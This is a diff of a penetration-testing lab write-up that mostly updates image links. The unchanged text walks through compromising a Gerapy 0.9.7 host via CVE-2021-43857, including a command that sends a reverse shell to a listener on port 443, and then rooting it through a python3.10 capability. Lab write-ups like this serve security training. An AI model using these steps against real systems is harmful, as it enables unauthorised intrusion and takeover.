@@ -101,52 +101,52 @@ Nmap done: 1 IP address (1 host up) scanned in 111.00 seconds
 
 On port 8000 shows a webpage running on `WSGIServer 0.2`.
 
-![Pasted image 20231112194914](https://github.com/tehokopi/Proving-Grounds/assets/150654583/2f93914e-9935-4446-913d-a62266086555)
+![Pasted image 20231110184502](https://github.com/tehokopi/Proving-Grounds/assets/150654583/70aabb6d-8b3c-45f4-813c-dbf961a67d3d)
 
 
 Trying some credentials such as admin:admin
-![[Pasted image 20231110184617.png]]
+![Pasted image 20231110184617](https://github.com/tehokopi/Proving-Grounds/assets/150654583/717537ff-3118-45fd-872b-b448acc0fa7b)
 
 Brought us to the login page. At the bottom, we see a `Gerapy v.0.9.7`, which will be taken note of.
-![[Pasted image 20231110184653.png]]
+![Pasted image 20231110184653](https://github.com/tehokopi/Proving-Grounds/assets/150654583/34fd0d35-f931-45e2-9582-313afcf48be7)
 Googling the Graphy v0.9.7, there's an exploit on both github and exploitdb.
 https://github.com/LongWayHomie/CVE-2021-43857
 https://www.exploit-db.com/exploits/50640
 
 At first, running the exploit keeps giving an index out of range error.
-![[Pasted image 20231110205858.png]]
+![Pasted image 20231110205858](https://github.com/tehokopi/Proving-Grounds/assets/150654583/316132d3-cf39-45c1-85cf-e2f070ab7878)
 
 Reading the README on github,
-![[Pasted image 20231110210029.png]]
+![Pasted image 20231110210029](https://github.com/tehokopi/Proving-Grounds/assets/150654583/b9d37ff1-c6cb-4982-a4ea-1b6d1d174270)
 
 The exploit will fail if there are no projects, hence, create a random project called test.
-![[Pasted image 20231110210100.png]]
+![Pasted image 20231110210100](https://github.com/tehokopi/Proving-Grounds/assets/150654583/ad234033-9e98-47d4-b764-2acab5706f16)
 
 Then run the exploit again
  `python3 CVE.py -t 192.168.196.24 -p 8000 -L 192.168.45.157 -P 443`
 
 
-![[Pasted image 20231110210117.png]]
+![Pasted image 20231110210117](https://github.com/tehokopi/Proving-Grounds/assets/150654583/cd2b828b-a2c8-49db-8731-ad09448a2f0e)
 
 Then we get a shell on our listening port on 443.
-![[Pasted image 20231110210202.png]]
+![Pasted image 20231110210202](https://github.com/tehokopi/Proving-Grounds/assets/150654583/42223e6b-3993-44cc-8bf5-6e9b76a96cda)
 
 # Privilege Escalation
 
 Running Linpeas to enumerate
 We see capabilities set on python3.10
-![[Pasted image 20231111012423.png]]
+![Pasted image 20231111012423](https://github.com/tehokopi/Proving-Grounds/assets/150654583/2c34d378-7ce2-4e05-858a-9ad96cd7fee4)
 
 This can also be viewed with the command:
 `/usr/sbin/getcap -r / 2>/dev/null`
 
 Now, create a script with the following and transfer it to the target:
-![[Pasted image 20231111012610.png]]
+![Pasted image 20231111012610](https://github.com/tehokopi/Proving-Grounds/assets/150654583/ca9f3655-978d-4135-b52a-37e8fe776d61)
 setting the  setuid to 0
 
 Running the exploit with :
 python3.10 exploit.py
 
 And we achieve root
-![[Pasted image 20231111012657.png]]
+![Pasted image 20231111012657](https://github.com/tehokopi/Proving-Grounds/assets/150654583/9455064f-11d7-4106-b524-865cb7da8a9c)
 
